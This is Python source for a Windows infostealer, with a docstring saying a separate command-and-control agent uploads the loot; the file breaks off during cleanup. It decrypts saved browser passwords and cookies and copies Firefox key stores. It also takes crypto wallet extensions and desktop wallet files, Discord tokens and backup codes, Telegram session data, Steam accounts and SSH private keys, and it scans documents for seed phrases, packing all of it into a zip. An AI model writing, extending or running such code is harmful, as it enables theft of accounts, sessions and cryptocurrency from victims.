#!/usr/bin/env python3
r"""
Infostealer – saves loot to C:\Users\Public\stealer_loot.zip
No network activity – the C2 agent will upload it.
C:\Users\Public always exists on every Windows machine.
"""

import os, sys, json, re, shutil, subprocess, zipfile, tempfile, logging, datetime, pathlib, configparser, sqlite3, ctypes, base64, struct
import winreg, time

# ============ CONFIG ============
LOOT_DIR = pathlib.Path(r"C:\Users\Public")
LOOT_ZIP = LOOT_DIR / "stealer_loot.zip"
LOG_FILE = LOOT_DIR / "stealer.log"

# Only discord_tokens.exe is bundled now — no hack-browser-data.exe needed
if getattr(sys, 'frozen', False):
    _MEIPASS = pathlib.Path(sys._MEIPASS)
    DISCORD_TOKEN_EXE = _MEIPASS / "discord_tokens.exe"
else:
    _SCRIPT_DIR = pathlib.Path(os.path.dirname(os.path.abspath(__file__)))
    DISCORD_TOKEN_EXE = _SCRIPT_DIR / "discord_tokens.exe"

TEMP_ROOT = pathlib.Path(tempfile.gettempdir()) / "kryo_harvest"
# ==================================

# ============ LOGGING ============
def setup_logging():
    LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
    logger = logging.getLogger('stealer')
    logger.setLevel(logging.DEBUG)
    fh = logging.FileHandler(str(LOG_FILE), encoding='utf-8')
    fh.setLevel(logging.DEBUG)
    formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s', datefmt='%H:%M:%S')
    fh.setFormatter(formatter)
    logger.addHandler(fh)
    sh = logging.StreamHandler(sys.stdout)
    sh.setLevel(logging.INFO)
    sh.setFormatter(logging.Formatter('[%(levelname)s] %(message)s'))
    logger.addHandler(sh)
    return logger

log = setup_logging()

# ============ HELPERS ============
def expand_env_path(p):
    for var in ('APPDATA','LOCALAPPDATA','USERPROFILE','PROGRAMDATA','PROGRAMFILES'):
        p = p.replace(f'%{var}%', os.environ.get(var,''))
    return p

def run_cmd(cmd, timeout=60):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r
    except:
        return None

# ============ WINDOWS DPAPI ============
class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', ctypes.c_ulong), ('pbData', ctypes.POINTER(ctypes.c_char))]

def dpapi_decrypt(data: bytes) -> bytes:
    """Decrypt bytes using Windows CryptUnprotectData (DPAPI)."""
    buf = ctypes.create_string_buffer(data, len(data))
    blob_in  = DATA_BLOB(len(data), buf)
    blob_out = DATA_BLOB()
    ok = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out))
    if not ok:
        return b''
    result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    return result

# ============ CHROME AES-GCM DECRYPTION ============
def _get_master_key(user_data_dir: pathlib.Path):
    """Read and decrypt the AES master key from Local State."""
    ls = user_data_dir / "Local State"
    if not ls.exists():
        return None
    try:
        state = json.loads(ls.read_text(encoding='utf-8'))
        enc_key = base64.b64decode(state['os_crypt']['encrypted_key'])
        enc_key = enc_key[5:]   # strip 'DPAPI' prefix
        return dpapi_decrypt(enc_key)
    except:
        return None

def _chrome_decrypt(key: bytes, enc: bytes) -> str:
    """Decrypt a Chrome v10/v20 AES-256-GCM encrypted value."""
    try:
        if enc[:3] in (b'v10', b'v20'):
            # AES-256-GCM: [3-byte tag][12-byte IV][ciphertext+16-byte auth tag]
            iv   = enc[3:15]
            data = enc[15:]
            # Use ctypes BCrypt (no third-party deps) or fall back to cryptography
            try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                return AESGCM(key).decrypt(iv, data, None).decode('utf-8', errors='replace')
            except ImportError:
                pass
            # Fallback: pyaes if available
            try:
                import pyaes
                cipher = pyaes.AESModeOfOperationGCM(key, iv)
                return cipher.decrypt(data[:-16]).decode('utf-8', errors='replace')
            except:
                pass
            return '<encrypted>'
        else:
            # Legacy: DPAPI-encrypted directly
            return dpapi_decrypt(enc).decode('utf-8', errors='replace')
    except:
        return '<decrypt-error>'

# ============ BROWSER DUMP (pure Python) ============
BROWSER_DATA_ROOTS = [
    ("Chrome",   r"%LOCALAPPDATA%\Google\Chrome\User Data",              True),
    ("Edge",     r"%LOCALAPPDATA%\Microsoft\Edge\User Data",             True),
    ("Brave",    r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data",True),
    ("Opera",    r"%APPDATA%\Opera Software\Opera Stable",               True),
    ("Vivaldi",  r"%LOCALAPPDATA%\Vivaldi\User Data",                    True),
    ("Firefox",  r"%APPDATA%\Mozilla\Firefox",                           False),
]

def _safe_copy_db(src: pathlib.Path) -> pathlib.Path:
    """Copy a potentially-locked SQLite DB to a temp file."""
    tmp = pathlib.Path(tempfile.mktemp(suffix='.db'))
    try:
        shutil.copy2(src, tmp)
        return tmp
    except:
        return None

def dump_all_browsers() -> dict:
    """Return dict: {browser: {passwords:[...], cookies:[...], history:[...]}}"""
    all_data = {}
    profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]

    for browser_name, raw_path, is_chromium in BROWSER_DATA_ROOTS:
        base = pathlib.Path(expand_env_path(raw_path))
        if not base.exists():
            continue

        if not is_chromium:
            # Firefox: grab key4.db + logins.json (offline cracking later)
            ff_data = {"key_dbs": [], "logins": []}
            try:
                cfg = configparser.ConfigParser()
                cfg.read(str(base / "profiles.ini"), encoding='utf-8')
                for sec in cfg.sections():
                    rel = cfg.get(sec, "Path", fallback=None)
                    if not rel: continue
                    is_rel = cfg.get(sec, "IsRelative", fallback="1") == "1"
                    pp = (base / rel) if is_rel else pathlib.Path(rel)
                    for f in ("key4.db", "logins.json", "cookies.sqlite"):
                        fp = pp / f
                        if fp.exists():
                            ff_data["key_dbs"].append(str(fp))
                    lj = pp / "logins.json"
                    if lj.exists():
                        try:
                            ff_data["logins"] = json.loads(lj.read_text(encoding='utf-8')).get("logins", [])
                        except: pass
            except: pass
            all_data[browser_name] = ff_data
            continue

        key = _get_master_key(base)
        browser = {"passwords": [], "cookies": [], "history": []}

        for prof in profiles:
            prof_dir = base / prof
            if not prof_dir.is_dir():
                continue

            # --- PASSWORDS ---
            for db_name in ("Login Data", "Login Data For Account"):
                db_path = prof_dir / db_name
                if not db_path.exists(): continue
                tmp = _safe_copy_db(db_path)
                if not tmp: continue
                try:
                    conn = sqlite3.connect(str(tmp))
                    for url, user, enc_pass in conn.execute(
                            "SELECT origin_url, username_value, password_value FROM logins"):
                        if not enc_pass: continue
                        pw = _chrome_decrypt(key, enc_pass) if key else '<no-key>'
                        if user or pw:
                            browser["passwords"].append({"url": url, "username": user, "password": pw, "profile": prof})
                    conn.close()
                except: pass
                finally:
                    try: tmp.unlink()
                    except: pass

            # --- COOKIES ---
            for db_name in ("Cookies", "Network/Cookies"):
                db_path = prof_dir / db_name
                if not db_path.exists(): continue
                tmp = _safe_copy_db(db_path)
                if not tmp: continue
                try:
                    conn = sqlite3.connect(str(tmp))
                    rows = conn.execute(
                        "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure "
                        "FROM cookies LIMIT 5000").fetchall()
                    for host, name, enc_val, path_, exp, secure in rows:
                        val = _chrome_decrypt(key, enc_val) if key and enc_val else ''
                        browser["cookies"].append({"host": host, "name": name, "value": val,
                                                   "path": path_, "secure": bool(secure)})
                    conn.close()
                except: pass
                finally:
                    try: tmp.unlink()
                    except: pass

            # --- HISTORY ---
            db_path = prof_dir / "History"
            if db_path.exists():
                tmp = _safe_copy_db(db_path)
                if tmp:
                    try:
                        conn = sqlite3.connect(str(tmp))
                        rows = conn.execute(
                            "SELECT url, title, visit_count, last_visit_time "
                            "FROM urls ORDER BY last_visit_time DESC LIMIT 500").fetchall()
                        for url, title, cnt, ts in rows:
                            browser["history"].append({"url": url, "title": title, "visits": cnt})
                        conn.close()
                    except: pass
                    finally:
                        try: tmp.unlink()
                        except: pass

        total = len(browser["passwords"]) + len(browser["cookies"])
        if total > 0:
            log.info(f"{browser_name}: {len(browser['passwords'])} passwords, "
                     f"{len(browser['cookies'])} cookies, {len(browser['history'])} history")
        all_data[browser_name] = browser

    return all_data

# ============ EXTENSION IDS & ROOTS ============
ACTIVE_EXTENSIONS = {
    "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
    "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
    "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase",
    "fhbohimaelbohpjbbldcngcnapndodjp": "Binance Chain",
    "ibnejdfjmmkpcnlpebklmnkoeoihofec": "TronLink",
    "bhhhlbepdkbapadjdnnojkbgioiodbic": "SafePal",
    "hpglfhgfnhbgpjdenjgmdgoeiappafln": "Guarda",
    "blnieiiffboillknjnepogjhkgnoapac": "EQUAL Wallet",
    "cjelfplplebdjjenllpjcblmjkfcffne": "Jaxx Liberty",
    "fnnegphlobjdpkhecapkijjdkgcjhkuk": "Huobi Wallet",
    "pioclpoplcdbaefihamjohnefbikjilc": "Exodus Web3",
    "dmkamcknogkgcdfhhbddcghachkejeap": "Keplr",
    "aholpfdialjgjfhomihkjbmgjidlcdno": "Finnie",
    "kncchdigobghenbbaddojjnnaogfppfj": "iWallet",
    "amkmjjmmflddogmhpjloimipbofnfjih": "Wombat",
    "fhilaheimglignddkjgofkcbgekhenbh": "Oxygen",
    "lpfcbjknijpeeillifnkikgncikgfhdo": "Nami",
    "dngmlblcodfobpdpecaadgfbcggfjfnm": "MultiversX DeFi",
    "nanjmdknhkinifnkgdcggcfnhdaammmj": "Guild Wallet",
    "jiidiaalihmmhdlpbkklhpibndnjaanb": "KardiaChain",
    "acmacodkjbdgmoleebolmdjonilkdbch": "Rabby",
    "bocpokimicclpaiekenaeelehahpmgkb": "Crypto.com DeFi",
    "odbfpeeihdkbihmopkbjmoonfanlbfcl": "Overline Network",
    "mcohilncbfahbmgdjkbpemcciiolgcge": "OKX Wallet",
    "bcopgchhojmggmffilplmbdicgaihlkp": "Hycon Lite Client",
    "kjmoohlgokccodicjjfebfomlbljgfhk": "Ronin Wallet",
    "pdadjkfkgcafgbceimcpbkalnfnepbnk": "KardiaChain",
}
FIREFOX_EXTENSION_IDS = {
    "webextension@metamask.io": "MetaMask",
    "phantom@phantom.app": "Phantom",
    "{d10d0bf8-f5b5-c8b4-a8b2-2b9879e08c5d}": "Adblock Plus",
}

def collect_browser_ext_wallets():
    ext_storage_root = TEMP_ROOT / "browser_crypto_exts"
    found_wallets = set()
    for browser_name, raw_path, is_chromium in BROWSER_DATA_ROOTS:
        base = pathlib.Path(expand_env_path(raw_path))
        if not base.exists(): continue
        ext_dir = ext_storage_root / browser_name
        ext_dir.mkdir(parents=True, exist_ok=True)
        if is_chromium:
            for prof_name in ["Default"] + [f"Profile {i}" for i in range(1, 10)]:
                prof_dir = base / prof_name
                if not prof_dir.is_dir(): continue
                for ext_id, wallet_name in ACTIVE_EXTENSIONS.items():
                    for src in [
                        prof_dir / "Local Extension Settings" / ext_id,
                        prof_dir / "IndexedDB" / f"chrome-extension_{ext_id}_0.indexeddb.leveldb"
                    ]:
                        if src.exists():
                            dest = ext_dir / f"{prof_name}_{ext_id}"
                            try:
                                shutil.copytree(src, dest, dirs_exist_ok=True)
                                found_wallets.add(wallet_name)
                            except: pass
        else:
            profiles_ini = base / "profiles.ini"
            if not profiles_ini.exists(): continue
            cfg = configparser.ConfigParser()
            cfg.read(str(profiles_ini), encoding='utf-8')
            for sec in cfg.sections():
                path_rel = cfg.get(sec, "Path", fallback=None)
                if not path_rel: continue
                is_rel = cfg.get(sec, "IsRelative", fallback="1") == "1"
                pp = (base / path_rel) if is_rel else pathlib.Path(path_rel)
                ext_folder = pp / "extensions"
                if ext_folder.exists():
                    for item in ext_folder.iterdir():
                        for ff_id, w_name in FIREFOX_EXTENSION_IDS.items():
                            if w_name.lower() in item.name.lower():
                                dest = ext_dir / item.name
                                if item.is_dir(): shutil.copytree(item, dest, dirs_exist_ok=True)
                                else:
                                    dest.parent.mkdir(parents=True, exist_ok=True)
                                    shutil.copy2(item, dest)
                                found_wallets.add(w_name)
    return ext_storage_root, list(found_wallets)

# ============ DESKTOP WALLETS ============
WALLET_APPS = [
    {"name": "Exodus",         "paths": [r"%APPDATA%\Exodus", r"%LOCALAPPDATA%\exodus"]},
    {"name": "Atomic Wallet",  "paths": [r"%APPDATA%\atomic\Local Storage\leveldb"]},
    {"name": "Electrum",       "paths": [r"%APPDATA%\Electrum"]},
    {"name": "Bitcoin Core",   "paths": [r"%APPDATA%\Bitcoin"]},
    {"name": "Monero",         "paths": [r"%PROGRAMDATA%\bitmonero", r"%USERPROFILE%\Documents\Monero\wallets"]},
    {"name": "Zcash",          "paths": [r"%APPDATA%\Zcash"]},
    {"name": "Wasabi Wallet",  "paths": [r"%APPDATA%\WalletWasabi\Client"]},
    {"name": "Trust Wallet",   "paths": [r"%LOCALAPPDATA%\Programs\trust-wallet"]},
    {"name": "Ledger Live",    "paths": [r"%APPDATA%\Ledger Live"]},
    {"name": "Trezor Suite",   "paths": [r"%APPDATA%\@trezor\suite-desktop"]},
    {"name": "Coinomi",        "paths": [r"%APPDATA%\Coinomi"]},
    {"name": "Guarda",         "paths": [r"%APPDATA%\Guarda", r"%LOCALAPPDATA%\Guarda"]},
    {"name": "Binance Desktop","paths": [r"%LOCALAPPDATA%\binance"]},
]

def collect_wallets():
    wallet_dir = TEMP_ROOT / "wallets"
    wallet_dir.mkdir(parents=True, exist_ok=True)
    found = []
    EXODUS_CRITICAL = {"exodus.wallet", "storage.seco", "seed.seco", "unsafe-storage.json"}
    for wallet in WALLET_APPS:
        for raw_path in wallet["paths"]:
            src = pathlib.Path(expand_env_path(raw_path))
            if not src.exists(): continue
            try:
                dest = wallet_dir / wallet["name"]
                dest.mkdir(parents=True, exist_ok=True)
                if wallet["name"] == "Exodus":
                    for root, dirs, files in os.walk(str(src)):
                        dirs[:] = [d for d in dirs if d == "exodus.wallet"]
                        for file in files:
                            if file.lower() in EXODUS_CRITICAL:
                                full = pathlib.Path(root) / file
                                rel = full.relative_to(src)
                                dest_file = dest / rel
                                dest_file.parent.mkdir(parents=True, exist_ok=True)
                                shutil.copy2(full, dest_file)
                else:
                    for root, dirs, files in os.walk(str(src)):
                        dirs[:] = [d for d in dirs if d not in {'Cache','Logs','tmp','node_modules'}]
                        for file in files:
                            full = pathlib.Path(root) / file
                            if full.suffix.lower() in {'.log','.tmp','.exe','.dll'} or full.stat().st_size > 50*1024*1024:
                                continue
                            rel = full.relative_to(src)
                            dest_file = dest / rel
                            dest_file.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(full, dest_file)
                found.append(wallet["name"])
                break
            except Exception as e:
                log.warning(f"Wallet error {wallet['name']}: {e}")
    return wallet_dir, found

# ============ DISCORD TOKENS ============
def collect_discord_tokens_go():
    log.info("Discord token extraction via Go module")
    try:
        exe_path = str(DISCORD_TOKEN_EXE)
        if not os.path.isfile(exe_path):
            log.warning(f"discord_tokens.exe not found — skipping")
            return []
        result = subprocess.run([exe_path], capture_output=True, text=True, timeout=30)
        tokens = json.loads(result.stdout)
        log.info(f"Discord tokens extracted: {len(tokens)}")
        return tokens
    except:
        return []

def collect_discord_backup_codes():
    codes = []
    try:
        home = os.path.expanduser("~")
        for ud in ["Desktop","Downloads","Documents","Videos","Pictures","Music","OneDrive"]:
            d = pathlib.Path(home)/ud
            if not d.exists(): continue
            for f in d.rglob("discord_backup_codes*"):
                if f.is_file() and f.stat().st_size < 2*1024*1024:
                    try:
                        codes.append({"path": str(f), "content": f.read_text(encoding='utf-8', errors='ignore')})
                    except: pass
    except: pass
    return codes

# ============ TELEGRAM ============
def collect_telegram():
    run_cmd(["taskkill","/f","/im","telegram.exe"], timeout=5)
    time.sleep(1)
    tdata = pathlib.Path(expand_env_path(r"%APPDATA%\Telegram Desktop\tdata"))
    if not tdata.exists():
        return None
    dest = TEMP_ROOT / "telegram_tdata"
    def ignore_locked(_, names):
        return {"cache","media_cache","working"} & set(names)
    try:
        shutil.copytree(str(tdata), str(dest), ignore=ignore_locked, dirs_exist_ok=True)
        log.info("Telegram tdata collected")
    except Exception as e:
        log.warning(f"Telegram copy: {e}")
        return None
    return dest

# ============ STEAM, SSH, SEEDS ============
def collect_steam():
    accounts = []
    for steam_root in (r"C:\Program Files (x86)\Steam", r"C:\Program Files\Steam"):
        login_file = pathlib.Path(steam_root) / "config" / "loginusers.vdf"
        if login_file.exists():
            try:
                content = login_file.read_text(encoding='utf-8', errors='ignore')
                names = re.findall(r'"PersonaName"\s+"([^"]+)"', content)
                accs  = re.findall(r'"AccountName"\s+"([^"]+)"', content)
                for i, acc in enumerate(accs):
                    accounts.append({"account": acc, "persona": names[i] if i < len(names) else ""})
                break
            except: pass
    return accounts

def collect_ssh():
    keys = []
    ssh_dir = pathlib.Path(expand_env_path(r"%USERPROFILE%\.ssh"))
    if ssh_dir.exists():
        for fname in ssh_dir.iterdir():
            if fname.is_file() and fname.suffix != '.pub':
                try:
                    content = fname.read_text(encoding='utf-8', errors='ignore')
                    if "PRIVATE KEY" in content:
                        keys.append({"filename": fname.name, "content": content})
                except: pass
    return keys

BIP39_WORDS = set("""abandon ability able about above absent absorb abstract absurd abuse access
accident account accuse achieve acid acoustic acquire across act action actor
actress actual adapt add addict address adjust admit adult advance advice aerobic
afford afraid again age agent agree ahead aim air airport aisle alarm album
alcohol alert alien all alley allow almost alone alpha already also alter always
amateur amazing among amount amused analyst anchor ancient anger angle angry
animal ankle announce annual another answer antenna antique anxiety any apart
apology appear apple approve april arch arctic area arena argue arm armed armor
army around arrange arrest arrive arrow art artefact artist artwork ask aspect
assault asset assist assume asthma athlete atom attack attend attitude attract
audit august aunt author auto autumn average avocado avoid awake aware away awesome
awful awkward axis baby bachelor bacon badge bag balance balcony ball bamboo banana
banner bar barely bargain barrel base basic basket battle beach bean beauty because
become beef before begin behave behind believe below belt bench benefit best betray
better between beyond bicycle bid bike bind biology bird birth bitter black blade
blame blanket blast bleak bless blind blood blossom blouse blue blur blush board
boat body boil bomb bone book boost border boring borrow boss bottom bounce box
boy bracket brain brand brave breeze brick bridge brief bright bring brisk broccoli
broken bronze broom brother brown brush bubble buddy budget buffalo build bulb bulk
bullet bundle bunker burden burger burst bus business busy butter buyer buzz cabbage
cabin cable cactus cage cake call calm camera camp canal cancel candy cannon canvas
canyon capable capital captain car carbon card cargo carpet carry cart case cash
casino castle casual cat catalog catch cause cave ceiling celery cement census chair
chalk chance change chaos chapter charge chase chat cheap check cheese chef cherry
chest chicken chief child chimney choice choose chronic chuckle chunk cigar cinema
circle citizen city civil claim clap clarify claw clay clean clerk clever click
client cliff climb clinic clip clock clog close cloth cloud clown club clump cluster
coarse coat coconut code coffee coil coin collect color column combine come comfort
comic common company concert conduct confirm congress connect consider control convince
cook cool copper copy coral core corn correct cost cotton couch country couple courage
course cousin cover coyote crack cradle craft cram crane crash crater crawl crazy
cream credit creek crew cricket crime crisp critic cross crouch crowd crucial cruel
cruise crumble crunch crush cry crystal cube culture cup cupboard curious current
curtain curve cushion custom cute cycle dad damage damp dance danger daring dash
daughter dawn day deal debate debris decade december decide decline decorate decrease
deer defense define defy degree delay deliver demand demise denial dentist deny
depart depend deposit depth deputy derive describe desert design desk despair destroy
detail detect develop device devote diagram dial diamond diary dice diesel diet
differ digital dignity dilemma dinner dinosaur direct dirt disagree discover disease
dish dismiss disorder display distance divert divide divorce dizzy doctor document
dog doll dolphin domain donate donkey donor door dose double dove draft dragon drama
drastic draw dream dress drift drill drink drip drive drop drum dry duck dumb dune
during dust dutch duty dwarf dynamic eager eagle early earn earth easily east easy
echo ecology edge edit educate effort egg eight either elbow elder electric elegant
element elephant elevator elite else embark embody embrace emerge emotion employ
empower empty enable enact endless endorse enemy engage engine enhance enjoy enlist
enough enrich enroll ensure enter entire entry envelope episode equal equip erase
erode erosion error erupt escape essay essence estate eternal ethics evidence evil
evolve exact example excess exchange excite exclude excuse execute exercise exhaust
exhibit exile exist exit exotic expand expire explain expose express extend extra eye
fable face faculty fade faint faith fall false fame family famous fan fancy fantasy
far fashion fat fatal father fatigue fault favorite feature february federal fee feed
feel feet fellow felt fence festival fetch fever few fiber fiction field figure file
film filter final find fine finger finish fire firm first fiscal fish fit fitness fix
flag flame flash flat flavor flee flight flip float flock floor flower fluid flush fly
foam focus fog foil follow food foot force forest forget fork fortune forum forward
fossil foster found fox fragile frame frequent fresh friend fringe frog front frost
frown frozen fruit fuel fun funny furnace fury future gadget gain galaxy gallery game
gap garbage garden garlic garment gas gasp gate gather gauge gaze general genius genre
gentle genuine gesture ghost giant gift giggle ginger giraffe girl give glad glance
glare glass glide glimpse globe gloom glory glove glow glue goat goddess gold good
goose gorilla gospel gossip govern gown grab grace grain grant grape grasp grass
gravity great green grid grief grit grocery group grow grunt guard guide guilt guitar
gun gym habit hair half hammer hamster hand happy harmony harvest hat have hawk hazard
head health heart heavy hedgehog height hello help hen hero hidden high hill hint hip
hire history hobby hockey hold hole holiday hollow home honey hood hope horn hospital
host hour hover hub huge human humble humor hundred hungry hunt hurdle hurry hurt
husband hybrid ice icon ignore ill illegal image imitate immense immune impact impose
improve impulse inbox income increase index indicate indoor industry infant inflict
inform inhale inject inner innocent input inquiry insane insect inside inspire install
intact interest into invest invite involve iron island isolate issue item ivory jacket
jaguar jar jazz jealous jeans jelly jewel job join joke journey joy judge juice jump
jungle junior junk just kangaroo keen keep ketchup key kick kid kingdom kiss kit
kitchen kite kitten kiwi knee knife knock know lab ladder lamp language laptop large
later laugh laundry lava law lawn lawsuit layer lazy leader learn leave lecture left
leg legal legend leisure lemon lend length lens leopard lesson letter level liar liberty
library license life lift like limb limit lion liquid list little live lizard load loan
lobster local lock logic lonely long loop lottery loud lounge love loyal lucky luggage
lumber lunar lunch luxury mad magic magnet maid main mammal mango mansion manual maple
marble march margin marine market marriage mask master match maze meadow mean medal
media melody melt member memory mention merchant mercy mesh message metal method
middle midnight milk million mimic mind minimum minor minute miracle miss mixed
mixture mobile model modify mom monitor monkey monster month moon moral mother motion
mouse move movie much muffin mule multiply muscle museum mushroom music must mutual
myself mystery naive name napkin narrow nasty nature near neck need negative neglect
neither nephew nerve nest network neutral never news next nice night noble noise
nominee noodle normal north notable note nothing notice novel now nuclear number
object oblige obscure obtain ocean october odor off offer office often oil okay old
olive olympic omit once onion open option orange orbit orchard order ordinary organ
orient original orphan ostrich other outdoor output outside oval over own oyster ozone
paddle page pair palace palm panda panel panic panther paper parade parent park parrot
party pass patch path patrol pause pave payment peace peanut peasant pelican pen
penalty pencil people pepper perfect permit person pet phone photo phrase physical piano
picnic piece pig pigeon pill pilot pink pioneer pipe pistol pitch pizza place planet
plastic plate play please pledge pluck plug plunge poem poet point polar pole police
pond pony popular portion position possible post potato poverty powder power practice
praise predict prefer prepare present pretty prevent price pride primary print priority
prison private prize problem process produce profit program project promote proof
property prosper protect proud provide public pudding pull pulp pulse pumpkin punish
pupil purchase purity purpose push put puzzle pyramid quality quantum quarter question
quick quit quiz quote rabbit raccoon race rack radar radio rage rail rain raise rally
ramp ranch random range rapid rare rate rather raven reach ready real reason rebel
rebuild recall receive recipe record recycle reduce reflect reform refuse region regret
regular reject relax release relief rely remain remember remind remove render renew
rent reopen repair repeat replace report require rescue resemble resist resource
response result retire retreat return reunion reveal review reward rhythm ribbon rice
rich ride rifle right rigid ring riot ripple risk ritual rival river road roast robot
robust rocket romance roof rookie rotate rough round route royal rubber rude rug rule
run runway rural sad saddle sadness safe sail salad salmon salon salt salute same
sample sand satisfy satoshi sauce sausage save say scale scan scare scatter scene
scheme scissors scorpion scout scrap screen script scrub sea search season seat second
secret section select sell seminar senior sense sentence series service session settle
setup seven shadow shaft shallow share shed shell sheriff shield shift shine ship
shiver shock shoe shoot shop short shoulder shove shrimp shrug shuffle shy sibling
siege sight sign silent silk silly silver similar simple since sing siren sister
situate six size sketch skill skin skirt skull slab slam sleep slender slice slide
slight slim slogan slot slow slush small smart smile smoke smooth snack snake snap
sniff snow soap soccer social sock soda soft solar solution solve someone song soon
sorry soul sound soup source south space spare spatial spawn speak special speed spell
spend sphere spice spider spike spin spirit split spoil sponsor spoon spray spread
spring spy square squeeze squirrel stable stadium staff stage stairs stamp stand start
state stay steak steel stem step stereo stick still sting stock stomach stone stop
store stream street strike strong struggle student stuff stumble style subject submit
subway success such sudden suffer sugar suggest suit summer sun sunny sunset super
supply supreme sure surface surge surprise sustain swallow swamp swap swear sweet
swift swim swing sword symbol symptom syrup table tackle tag tail talent tamper tank
tape target task tattoo taxi teach team tell ten tenant tennis tent term test text
thank that theme then theory there they thing this thought three thrive throw thumb
thunder ticket tilt timber time tiny tip tired title toast tobacco today together
toilet token tomato tomorrow tone tongue tonight tool tooth top topic topple torch
tornado tortoise toss total tourist toward tower town toy track trade traffic tragic
train transfer trap trash travel tray treat tree trend trial trick trigger trim trip
trophy trouble truck truly trumpet trust truth tube tuition tumble tuna tunnel turkey
turn turtle twelve twenty twice twin twist two type typical ugly umbrella unable
unaware uncle uncover under undo unfair unfold unhappy uniform unique universe unknown
unlock until unusual unveil update upgrade uphold upon upper upset urban usage use
used useful useless usual utility vacant vacuum vague valid valley valve van vanish
vapor various vast vault vehicle velvet vendor venture verb verify version very vessel
veteran viable vibrant vicious victory video view village vintage violin viral virtue
vision visit visual vital vivid vocal voice void volcano volume vote voyage wage wagon
wait walk wall walnut want warfare warm warrior waste water wave way wealth weapon wear
weasel wedding weekend weird welcome well west wet whale wheat wheel when where whip
whisper wide width wife wild will win window wine wing wink winner winter wire wisdom
wise wish witness wolf woman wonder wood wool word world worry worth wrap wreck wrestle
wrist write wrong yard year yellow you young youth zebra zero zone zoo""".split())

def scan_for_seeds():
    findings = []
    up = os.environ.get("USERPROFILE","")
    SCAN_ROOTS = [os.path.join(up,"Desktop"), os.path.join(up,"Documents"), os.path.join(up,"Downloads"), up]
    SKIP_DIRS = {"AppData","Windows","Program Files","Program Files (x86)","nvidia","steam","discord"}
    for root in SCAN_ROOTS:
        if not os.path.exists(root): continue
        for dirpath, dirnames, filenames in os.walk(root, topdown=True):
            depth = dirpath.replace(root,"").count(os.sep)
            if depth > 4:
                del dirnames[:]
                continue
            dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
            for fname in filenames:
                if pathlib.Path(fname).suffix.lower() not in {'.txt','.md','.key','.seed','.wallet','.env','.json','.dat'}:
                    continue
                fpath = pathlib.Path(dirpath)/fname
                try:
                    if fpath.stat().st_size > 512*1024: continue
                    text = fpath.read_text(encoding='utf-8', errors='ignore')
                    words = re.findall(r'\b[a-z]+\b', text.lower())
                    for length in (12,18,24):
                        for i in range(len(words)-length+1):
                            chunk = words[i:i+length]
                            if all(w in BIP39_WORDS for w in chunk):
                                findings.append({"phrase":" ".join(chunk),"words":length,"file":str(fpath)})
                except: pass
    return findings

# ============ BUILD ZIP ============
def build_and_send(browser_data, wallet_dir, wallets_found, ext_wallet_dir, ext_wallets_found,
                   tokens, steam_accs, ssh_keys, telegram_dir, seeds, backup_codes):
    log.info("Building loot.zip")
    final = LOOT_ZIP
    with zipfile.ZipFile(final, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Browser credentials (pure Python extracted)
        zf.writestr("browsers/credentials.json", json.dumps(browser_data, indent=2, ensure_ascii=False))

        # Ext wallets
        if ext_wallet_dir.exists():
            for root, _, files in os.walk(str(ext_wallet_dir)):
                for file in files:
                    full = pathlib.Path(root)/file
                    zf.write(str(full), arcname=f"browser_ext_wallets/{full.relative_to(ext_wallet_dir)}")

        # Desktop wallets
        if wallet_dir.exists():
            for root, _, files in os.walk(str(wallet_dir)):
                for file in files:
                    full = pathlib.Path(root)/file
                    zf.write(str(full), arcname=f"wallets/{full.relative_to(wallet_dir)}")

        if tokens:
            zf.writestr("discord_tokens.json", json.dumps(tokens, indent=2))
        if backup_codes:
            zf.writestr("discord_backup_codes.json", json.dumps(backup_codes, indent=2))

        if telegram_dir and telegram_dir.exists():
            for root, _, files in os.walk(str(telegram_dir)):
                for file in files:
                    full = pathlib.Path(root)/file
                    rel = full.relative_to(telegram_dir)
                    if "cache" not in rel.parts:
                        zf.write(str(full), arcname=f"telegram/{rel}")

        if steam_accs:
            zf.writestr("steam_accounts.json", json.dumps(steam_accs, indent=2))
        for key in ssh_keys:
            zf.writestr(f"ssh/{key['filename']}", key['content'])
        if seeds:
            zf.writestr("found_seeds.json", json.dumps(seeds, indent=2))

        summary = {
            "timestamp": datetime.datetime.now().isoformat(),
            "hostname": os.environ.get("COMPUTERNAME","unknown"),
            "desktop_wallets": wallets_found,
            "browser_ext_wallets": ext_wallets_found,
            "discord_tokens": len(tokens),
            "steam_accounts": len(steam_accs),
            "ssh_keys": len(ssh_keys),
            "seed_phrases": len(seeds),
            "backup_codes": len(backup_codes)
        }
        zf.writestr("summary.json", json.dumps(summary, indent=2))

    log.info(f"Loot zip created: {final} ({final.stat().st_size/1024:.1f} KB)")
    return final

# ============ MAIN ============
def main():
    log.info("=== Stealer Starting ===")
    LOOT_DIR.mkdir(parents=True, exist_ok=True)
    TEMP_ROOT.mkdir(parents=True, exist_ok=True)

    browser_data          = dump_all_browsers()
    wallet_dir, wallets_found = collect_wallets()
    ext_wallet_dir, ext_wallets_found = collect_browser_ext_wallets()
    tokens                = collect_discord_tokens_go()
    backup_codes          = collect_discord_backup_codes()
    telegram_dir          = collect_telegram()
    steam_accs            = collect_steam()
    ssh_keys              = collect_ssh()
    seeds                 = scan_for_seeds()

    final_zip = build_and_send(
        browser_data, wallet_dir, wallets_found, ext_wallet_dir, ext_wallets_found,
        tokens, steam_accs, ssh_keys, telegram_dir, seeds, backup_codes
    )

    # Cleanup
    if wallet_dir.exists():      shutil.rmtree(wallet_dir,      ignore_errors=True)
